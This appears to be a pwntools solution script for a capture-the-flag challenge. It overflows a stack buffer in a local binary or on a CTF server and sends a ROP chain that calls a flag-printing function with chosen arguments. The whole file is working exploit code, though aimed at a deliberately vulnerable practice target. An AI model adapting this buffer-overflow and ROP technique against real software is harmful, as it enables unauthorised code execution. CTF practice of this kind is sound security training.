#!/usr/local/bin/python3

from pwn import *
import ropgadget

flag_addr = 0x401256
bss_name = 0x00000000004040A0
pop_rdi = 0x00000000004013f3  # pop rdi ; ret
pop_rsi = 0x00000000004013f1  # pop rsi ; pop r15 ; ret

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

# choose the remote or local connection
if sys.argv[1] == "remote":
    r = remote("challs.actf.co", 31225)
else:
    r = process("./really_obnoxious_problem")
    gdb.attach(r, '''
    b main
    ''')
r.recvuntil(b"Name: ")
r.sendline(b"bobby")

r.recvuntil(b"Address: ")
payload = b"A" * (0x40 + 8) + p64(pop_rdi)+ p64(0x1337) + p64(pop_rsi) + p64(bss_name) + p64(0) +p64(flag_addr)
r.sendline(payload)

r.interactive()